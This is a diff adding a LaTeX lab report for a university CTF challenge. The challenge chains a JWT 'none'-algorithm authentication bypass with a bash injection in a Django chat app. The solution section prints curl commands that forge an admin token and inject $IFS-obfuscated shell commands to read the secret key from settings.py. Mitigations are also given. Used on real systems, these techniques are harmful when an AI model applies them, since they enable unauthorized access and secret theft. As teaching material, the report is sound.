@@ -1,0 +1,236 @@
+\documentclass[12pt,a4paper]{article}
+\usepackage[utf8]{inputenc}
+\usepackage{hyperref}
+\usepackage{graphicx}
+\usepackage{subcaption}
+\usepackage{float}
+\usepackage{paralist}
+
+\usepackage{listings}
+
+% ToDo's
+\usepackage{color}
+\newcommand{\mynote}[3]{
+  \textcolor{#2}{
+    \fbox{\bfseries\sffamily\scriptsize#1}
+    {\small\textsf{\emph{#3}}}
+}}
+
+% Inline-Code
+\newcommand{\code}[1]{\texttt{#1}}
+
+\lstset{
+	breaklines=true,
+	basicstyle=\ttfamily}
+
+
+\title{JSON Web Tokens and Bash Injection}
+\author{Network Security HS16 - Group 6\\Lukas Bischofberger, Silvan Egli, Jonas Passerini, Lukas Widmer}
+
+\begin{document}
+
+\maketitle
+
+\begin{abstract}
+%a short summary of the challenge. You should include the problem or vulnerability addressed by the challenge and the approach used to exploit the vulnerability.
+
+A chat services suffers from two vulnerabilities, which allow an arbitrary user to gain administrative access rights and to extract the secret key of the web application by performing a bash injection.
+The first part of the challenge is a JSON Web Token (JWT) vulnerability where the client is able to select a trivial 'none' signing algorithm. Using a fake authentication token, it is possible to circumvent the authentication mechanism and send chat messages as an administrator. This enables a normal user to send privileged admin commands.
+The second part of the challenge exploits a bash injection, which is possible due to a wrongly configured subprocess call with unsanitized user input and therefore allows arbitrary code execution. A malicious admin command can be crafted to extract the secret key from the settings file.
+
+\end{abstract}
+
+\section{Challenge Description}
+
+\subsection{Type of Challenge}
+%whether the challenge is online or offline. For example, exploiting a web application requires the application to be online, whereas analyzing captured packets can be done offline.
+
+The first part of the challenge requires to analyze and craft authentication tokens, which can be done offline. To test the crafted tokens, the web application needs to be online.
+
+For the second part of the challenge, the web application needs to be running in order to extract the secret key, and is therefore an online attack.
+
+\subsection{Category}
+%one or more categories for the challenge. You can see a full list of possible challenges by going to the Hacking Lab home page, clicking the Statistics tab near the center of the page, and then clicking Challenge Details under the Challenge Statistics box.
+
+The challenge belongs to the category Web Security and also requires some basic Linux and Networking understanding.
+
+\subsection{Mission}
+%a summary of the challenge objective. For example, a school's online registration form may have an SQL injection vulnerability. Using SQL injection in this form to execute a DROP statement can cause a school to lose their entire year's student records.
+
+A simple chat service is provided by a company in the form of a web application. There is only one chat room, and all authenticated users might read messages and send new ones to this chat room. There is an additional administrative role, which allows users belonging to this role to invoke several admin commands, e.g. to change the background color of the chat window. Admin commands sent by basic users have no effect.
+
+The secret key used by the chat service is  highly sensitive, since it is also used by other services of the company. The goal of the challenge is to expose the secret key.
+To achieve the goal, two vulnerabilities need to be combined in a clever way.
+In a first step, an attacker has access to a basic user account and the goal is to gain administrative user rights by circumventing the token based authentication mechanism.
+In a second step, the attacker uses the administrative rights gained in the previous step to craft a malicious admin command, which exposes the secret key.
+
+
+\subsection{Learning Goal}
+%what you hope students will learn from the challenge and why it is important. For example, if the challenge is to perform a TLS-based man-in-the-middle attack using a similar-looking domain name, students will learn the importance of checking that the domain name in the certificate matches the one in the address bar. This is important because it is usually much easier to obtain a fraudulent certificate for a similar-looking domain name than for the actual domain.
+
+The first part of the challenge teaches the student about how to collect and analyze token based authentication mechanisms, in particular JSON Web Tokens. The vulnerability should increase the awareness of the problem, if the client is allowed to choose the signing algorithm.
+
+The second part of the challenge demonstrates the danger of executing unsanitized input from an untrusted source and how to exploit such a vulnerability with a limited interface.
+
+
+\section{Implementation}
+%\subsection{Requirements}
+
+The web application is implemented in Python using the web framework Django and SQLite is used as the database backend. Token based authentication is provided by pyjwt, a Python implementation of JSON Web Tokens, which is either outdated or patched to enable the first vulnerability. The frontend of the chat application is implemented using Angular2. The admin commands are parsed by the web framework and then executed with a bash command in a subprocess, without sanitizing the input first. The bash commands have direct access to the local file system and allow an attacker to perform a bash injection.
+
+
+\section{Solution}
+
+\subsection{Hints}
+%up to three hints to give to users solving the challenge.
+\begin{enumerate}
+	\item Analyze the tokens used to authenticate chat messages. Can you decode the token to reveal further information about the library used to verify the tokens?
+	\item The admin commands do not require any database access. Try to find out what happens, e.g. if an administrator changes the background color of the chat window.
+	\item The secret key of a Django applications is usually stored in a file called settings.py
+\end{enumerate}
+
+\subsection{Step-by-Step Instructions}
+%a description of every step a user has to perform to solve the challenge. This does not need to be the final version, but it should allow us to get a feel for the challenge.
+
+The step-by-step instructions assume that you use Linux, but all the commands can be adopted to other systems. Most of the steps can also be performed directly in the browser by interacting with the Developer Tools of the browser and the web interface of the chat application. However, sending direct GET and POST requests using \code{curl} or a similar tool might reveal more interesting details.
+
+\subsubsection{Part 1: JWT Exploit to Bypass Authentication}
+
+\begin{enumerate}
+	\item Open the web application and log in as user \code{max} with the password \code{123456}.
+	\item Extract the JWT token, e.g. open the Developer Tools in the browser, go to the Application tab and inspect the Session Storage. Alternatively, you can also create a few messages and analyze the TCP packets using Wireshark~\cite{wireshark} or Tamper Data~\cite{tamperdata}. The token is of the form \code{Header.Payload.Token} and is \code{base64} encoded.
+	
+	Verify that you have the correct token by creating a new chat message using the following terminal command: 
+	\begin{verbatim}
+		curl https://web.netchat/api/messages/ --insecure
+		--data 'text=Hello World'
+		-H 'Authorization: JWT YOUR_TOKEN'
+	\end{verbatim}
+	
+	Reload the chat and you should see a new message created by the user \code{max}.
+	
+	\item Decode the token using a base64 decoder\footnote{\url{https://www.base64decode.org/}} or an online JWT Debugger\footnote{\url{https://jwt.io/}}. As you can see, the \code{Header} specifies an algorithm and the \code{Payload} contains all the user information such as the \code{username} or the \code{user\_id}. 
+	\item To craft a fake admin token, change the algorithm to \code{none}, set the \code{username} to \code{admin}, the \code{user\_id} to \code{1} and remove the \code{Signature} (but not the last dot). Re-encode the token, which then should have the form \code{Header.Payload.}
+	
+	Test your new token by creating a chat message:
+	\begin{verbatim}
+	curl https://web.netchat/api/messages/ --insecure
+	--data 'text=Hello Admin World'
+	-H 'Authorization: JWT ADMIN_TOKEN'
+	\end{verbatim}
+	
+	Reload the chat and you should see a message created by the user \code{admin}.
+	
+	\item One can also replace the JWT token inside the Session Storage of the browser with the crafted one such that the user of the web application is authenticated as the admin, and the commands can directly be created through the web interface.
+	 
+\end{enumerate}
+
+\subsubsection{Part 2: Expose the Secret Key with a Bash Injection}
+
+Note that you can directly jump to step 6 if you are only interested in extracting the secret key, but following all the steps provides you with a more detailed approach and how an attacker could come up with such a solution.
+
+\begin{enumerate}
+	\item Now that we have a valid token to authenticate ourself as an administrator, we can use the token to play around with the admin commands. The following command for example changes the background of the chat messages to red:
+	\begin{verbatim}
+		curl https://web.netchat/api/messages/ --insecure
+		--data 'text=\background red'
+		-H 'Authorization: JWT ADMIN_TOKEN'
+	\end{verbatim}
+	
+	Send a chat message using the web interface to verify that the background is now red.
+	
+	\item After issuing some admin commands through the web interface and analyzing the POST requests sent by the browser (e.g. with Wireshark or Tamper Data), one can observe that after each POST request, an additional GET request is performed to the API endpoint \code{https://web.netchat/api/css/} to fetch the new layout.
+	
+	Let's observe the response body of such a request by manually requesting it using the following terminal command:
+	\begin{verbatim}
+		curl https://web.netchat/api/css/ --insecure
+		-H 'Authorization: JWT ADMIN_TOKEN' 
+	\end{verbatim}
+	
+	The body of the response looks like basic CSS code, containing styling parameters for the border and the background of chat messages, exactly the same values which can be changed with the admin commands. Make sure that this request works, as it will become very important later.
+	
+	\item In the next step, try to issue various admin commands with different values for the colors and observe how the body of the CSS response changes. E.g. try the "color" \code{helloworld}:
+	\begin{verbatim}
+	curl https://web.netchat/api/messages/ --insecure
+	--data 'text=\background red'
+	-H 'Authorization: JWT ADMIN_TOKEN'
+	\end{verbatim}
+	
+	 You can also issue the command within the web application using the command \code{\textbackslash background helloworld}. Check that the value of the attribute \code{background} in the CSS response now really is \code{helloworld}.
+	 
+	 An additional, important observation is, that values containing white space like \code{hello world} are not working.
+	 
+	 \item To check whether the admin commands are vulnerable to shell injections, we have to prepare our shell commands without spaces, since they are otherwise not interpreted as command as seen in the previous step. There are several tricks to do so~\cite{whitespace}, one possibility is to use the Internal Field Separator \code{\$IFS} instead of a whitespace.
+	 
+	 When trying out some commands, e.g. to list the contents of the current working directory:
+	 \begin{verbatim}
+	 	curl https://web.netchat/api/messages/ --insecure
+	 	--data 'text=\background $(ls)'
+	 	-H 'Authorization: JWT ADMIN_TOKEN'
+	 \end{verbatim}
+	 
+	 one can see that the \code{status} flag of the message is \code{"Admin command error: sed: -e expression \#1, char 176: unknown option to s'\textbackslash n"}, which reveals that the internal mechanism works with the Linux program \code{sed}. This are great news, since we can use this as output for our shell injection, but in order to do so we need to replace any newline characters from the output. This can be achieved with the Linux command \code{tr}, which can be used to translate or remove characters. E.g. \code{ls | tr "\textbackslash n" ","} removes all newline characters from the output of the \code{ls} command and replaces them with a comma.
+	 
+	 If we replace all the spaces with Internal Field Separators, we can use the command to perform our first successful bash injection:
+	 
+	 \begin{verbatim}
+	 	curl https://web.netchat/api/messages/ --insecure
+	 	--data 'text=\background $(ls|tr$IFS"\n"$IFS",")'
+	 	-H 'Authorization: JWT ADMIN_TOKEN'
+	 \end{verbatim}
+	 
+	 If we now request the CSS layout again, we can see that the value of the \code{background} parameter now contains the directory listing:
+	 
+	 \code{chat,db.sqlite3,manage.py,requirements.txt,static,venv}
+	 
+	 \item By adjusting the command to
+	 
+	 \code{text=\textbackslash background \$(ls|tr\$IFS"\textbackslash n"\$IFS",")}
+
+	  one can see that there is a file called \code{settings.py} in the \code{chat} folder.
+	 
+	 \item Finally, expose the contents of the \code{settings.py} file with the following terminal command:
+	 
+	 \begin{verbatim}
+		 curl https://web.netchat/api/messages/ --insecure
+		 --data 'text=\background $({grep,SECRET,chat/settings.py})'
+		 -H 'Authorization: JWT ADMIN_TOKEN'
+	 \end{verbatim}
+	 
+	 Request the CSS layout with the command mentioned in step 2 to retrieve the secret key:
+	 
+	 \begin{verbatim}
+	 	"li { \n\tborder: red;\n\tbackground: SECRET_KEY =
+	 	'Congratulations you just compromised the highly
+	 	secure super duper secret key !' ;\n}\n"
+	 \end{verbatim}
+	 
+	 Another interesting approach would be to open a reverse shell using the shell injection and access the key directly.
+	 
+\end{enumerate}
+
+
+
+
+\section{Mitigation}
+%how can the vulnerability be fixed or mitigated so that the challenge exploit does not work? For example, if the challenge vulnerability is that an HTTPS request can be intercepted and rewritten as an HTTP request, a mitigation is to have the server's response enforce the future use of HTTPS. This would protect against future attacks, though not an ongoing attack.
+
+The JWT vulnerability can be solved by disallowing clients to choose an algorithm, especially disallowing the 'none' algorithm. Additionally, all dependencies should be kept up to date to prevent other vulnerabilities.
+
+The bash injection vulnerability can be prevented by properly sanitizing the user input and by disabling the shell access. A nicer solution would be to prevent the use of subprocesses completely and instead manage the color configuration within Django, e.g. by writing the values to the database and dynamically parse the website using a templating system.
+
+The attacker had full access to the system by executing arbitrary commands or opening a reverse shell, therefore the whole system is compromised and all keys should be renewed, including all the systems which used the same secret key.
+
+
+
+\section{Conclusion}
+The presented challenge consists of two vulnerabilities and demonstrates how they can be combined to extract the secret key of a web application. The student learns how JWT works and how the token authentication can be bypassed, if the client is able to select a weak or even trivial signing algorithm.
+The student also learns how to perform a bash injection by exploiting a subprocess call suffering from unsanitized user input.
+Both vulnerabilities reflect common problems, which could mostly be tackled in a simple way.
+
+
+
+\bibliographystyle{plain}
+\bibliography{bibliography}
+
+\end{document}
